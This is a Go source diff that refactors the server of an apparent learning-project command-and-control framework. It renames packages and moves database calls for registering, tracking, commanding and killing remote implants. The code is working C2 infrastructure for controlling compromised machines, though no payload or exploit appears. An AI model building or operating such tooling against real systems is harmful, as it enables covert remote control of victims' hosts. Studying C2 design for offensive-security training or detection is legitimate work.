@@ -1,7 +1,8 @@
 package server
 
 import (
-	"blackhatgo/c2c/grpcapi"
+	"blackhatgo/c2c/api"
+	"blackhatgo/c2c/storage"
 	"context"
 	"database/sql"
 	"errors"
@@ -16,25 +17,25 @@ import (
 )
 
 type sessionManager struct {
-	work    map[string]chan *grpcapi.Command
-	results map[string]chan *grpcapi.Command
+	work    map[string]chan *api.Command
+	results map[string]chan *api.Command
 }
 
 type implantServer struct {
-	grpcapi.UnimplementedImplantServer
+	api.UnimplementedImplantServer
 	sessions *sessionManager
 	implants map[uuid.UUID]time.Time
 	db       *sql.DB
 }
 
 type adminServer struct {
-	grpcapi.UnimplementedAdminServer
+	api.UnimplementedAdminServer
 	sessions *sessionManager
 	implants map[uuid.UUID]time.Time
 	db       *sql.DB
 }
 
-func NewSessionManager(work, results map[string]chan *grpcapi.Command) *sessionManager {
+func NewSessionManager(work, results map[string]chan *api.Command) *sessionManager {
 	return &sessionManager{
 		work:    work,
 		results: results,
@@ -57,16 +58,16 @@ func NewAdminServer(sessions *sessionManager, implants map[uuid.UUID]time.Time, 
 	return s
 }
 
-func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
+func (s *implantServer) FetchCommand(ctx context.Context, empty *api.Empty) (*api.Command, error) {
 	md, ok := metadata.FromIncomingContext(ctx)
 	if !ok {
 		return nil, status.Error(codes.Unauthenticated, "no metadata provided")
 	}
 
 	id := md["implant-id"][0]
-	updateLastSeen(s.db, id)
+	storage.UpdateLastSeen(s.db, id)
 
-	var cmd = new(grpcapi.Command)
+	var cmd = new(api.Command)
 	select {
 	case cmd, ok := <-s.sessions.work[id]:
 		if ok {
@@ -79,7 +80,7 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 	}
 }
 
-func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
+func (s *implantServer) SendOutput(ctx context.Context, result *api.Command) (*api.Empty, error) {
 	md, ok := metadata.FromIncomingContext(ctx)
 	if !ok {
 		return nil, status.Error(codes.Unauthenticated, "no metadata provided")
@@ -88,10 +89,10 @@ func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command)
 	id := md["implant-id"][0]
 
 	s.sessions.results[id] <- result
-	return &grpcapi.Empty{}, nil
+	return &api.Empty{}, nil
 }
 
-func (s *implantServer) RegisterNewImplant(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.RegisterResponse, error) {
+func (s *implantServer) RegisterNewImplant(ctx context.Context, empty *api.Empty) (*api.RegisterResponse, error) {
 	ipAddress := getClientIP(ctx)
 
 	implantId, err := uuid.NewUUID()
@@ -99,19 +100,19 @@ func (s *implantServer) RegisterNewImplant(ctx context.Context, empty *grpcapi.E
 		return nil, err
 	}
 	s.implants[implantId] = time.Now()
-	s.sessions.work[implantId.String()] = make(chan *grpcapi.Command)
-	s.sessions.results[implantId.String()] = make(chan *grpcapi.Command)
+	s.sessions.work[implantId.String()] = make(chan *api.Command)
+	s.sessions.results[implantId.String()] = make(chan *api.Command)
 
-	insertImplant(s.db, implantId, ipAddress, time.Now(), time.Now())
+	storage.InsertImplant(s.db, implantId, ipAddress, time.Now(), time.Now())
 
-	response := grpcapi.RegisterResponse{
+	response := api.RegisterResponse{
 		Id: implantId.String(),
 	}
 	return &response, nil
 }
 
-func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
-	var res *grpcapi.Command
+func (s *adminServer) RunCommand(ctx context.Context, cmd *api.Command) (*api.Command, error) {
+	var res *api.Command
 	go func() {
 		s.sessions.work[cmd.ImplantId] <- cmd
 	}()
@@ -119,13 +120,13 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 	return res, nil
 }
 
-func (s *adminServer) ListRegisteredImplants(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.ImplantsList, error) {
-	implants, err := listImplants(s.db)
+func (s *adminServer) ListRegisteredImplants(ctx context.Context, empty *api.Empty) (*api.ImplantsList, error) {
+	implants, err := storage.ListImplants(s.db)
 	if err != nil {
 		return nil, err
 	}
 
-	response := grpcapi.ImplantsList{}
+	response := api.ImplantsList{}
 	now := time.Now()
 
 	// Threshold determines whether implant is online or offline
@@ -137,7 +138,7 @@ func (s *adminServer) ListRegisteredImplants(ctx context.Context, empty *grpcapi
 			status = "OFFLINE"
 		}
 
-		data := &grpcapi.ImplantData{
+		data := &api.ImplantData{
 			Id:        implant.ID.String(),
 			IpAddress: implant.IpAddress,
 			LastSeen:  implant.LastSeen.String(),
@@ -148,8 +149,8 @@ func (s *adminServer) ListRegisteredImplants(ctx context.Context, empty *grpcapi
 	return &response, nil
 }
 
-func (s *adminServer) DeleteImplant(ctx context.Context, deleteRequest *grpcapi.DeleteRequest) (*grpcapi.Empty, error) {
-	killCmd := &grpcapi.Command{
+func (s *adminServer) DeleteImplant(ctx context.Context, deleteRequest *api.DeleteRequest) (*api.Empty, error) {
+	killCmd := &api.Command{
 		IsKill: true,
 	}
 
@@ -160,10 +161,10 @@ func (s *adminServer) DeleteImplant(ctx context.Context, deleteRequest *grpcapi.
 		log.Printf("[!] Implant %s is offline. Skipping kill signal.", deleteRequest.Id)
 	}
 
-	err := deleteImplant(s.db, deleteRequest.Id)
+	err := storage.DeleteImplant(s.db, deleteRequest.Id)
 	if err != nil {
 		return nil, err
 	}
 
-	return &grpcapi.Empty{}, nil
+	return &api.Empty{}, nil
 }
